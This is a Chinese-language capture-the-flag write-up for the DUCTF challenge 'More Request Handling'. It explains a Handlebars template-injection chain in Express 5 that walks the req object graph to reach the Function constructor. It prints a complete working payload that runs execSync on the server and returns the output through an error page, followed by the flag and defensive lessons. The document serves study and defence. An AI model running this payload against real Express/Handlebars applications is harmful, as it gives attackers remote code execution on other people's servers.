# More Request Handling

## 题目简述

这一题把 Express 升级到 5，根路由仍然将攻击者的 `x` 直接编译为 Handlebars 模板，但这次把完整 `req` 对象作为模板上下文：

```javascript
app.get('/', (req, res) => {
    res.send(Handlebars.compile(req.query.x)({req}));
});
```

Handlebars 会阻止常见的 `constructor`、原型等危险属性访问，也会在 helper 调用时附加 options 参数，因而传统 SSTI payload 失效。漏洞链改为从 `req` 暴露的 Express 内部对象中找到 `app.set` 与 `EventEmitter.listenerCount`，借后者强制以前者的单参数 getter 形式调用，最终得到 `Function` 构造器并执行命令。

## 解题过程

### 绕开 Handlebars 的调用限制

Express 的 `app.set` 在只有一个参数时返回配置值：

```javascript
function set(setting, val) {
  if (arguments.length === 1) return this.settings[setting];
  this.settings[setting] = val;
}
```

但 Handlebars 普通函数调用会额外传 options，无法直接当 getter。`req.socket.server._events.request.constructor.listenerCount` 的实现会以两个可控参数调用第一个对象的 `listenerCount` 方法，恰好可作为“只传一个实际参数”的转发器。

以下模板是官方解题脚本中的完整主线。它先将 `app.locals.listenerCount` 指向 `app.set`，再用转发器读出 `settings.constructor`（即 `Function`），最后把 `listenerCount` 替换成 `Function` 并执行生成的函数：

```handlebars
{{#with req.socket.server._events.request.request.app.locals}}
  {{#with (../req.socket.server._events.request.request.app.set "settings" ../req.socket._events.error)}}{{/with}}
  {{#with (../req.socket.server._events.request.request.app.set "listenerCount" ../req.socket.server._events.request.request.app.set)}}{{/with}}
  {{#with (../req.socket.server._events.request.constructor.listenerCount settings "constructor")}}{{/with}}
  {{#with (../req.socket.server._events.request.constructor.listenerCount settings "(function () {throw new Error(process.mainModule.require('child_process').execSync('/getflag').toString())})()")}}{{/with}}
{{/with}}
```

最后的函数体读取 `/getflag`，再抛出带输出的异常，使 HTTP 错误页包含结果。这里不需要外部回连或临时攻击地址。

### 验证

错误响应中出现：

```text
DUCTF{f2684d92e8393ccb1427495ad587d185}
```

## 方法总结

- 核心技巧：用框架对象图中的正常函数拼出受限模板引擎缺少的反射能力，间接调用 `Function`。
- 识别信号：模板上下文泄露 `req`、`res`、应用对象或事件监听器时，不能只测试 `constructor` 是否被黑名单；还要寻找 getter/setter、回调包装和转发函数。
- 复用要点：不要把完整请求/应用对象交给模板。模板引擎的危险属性保护是纵深防御，真正的边界是最小化、不可变的 view model。
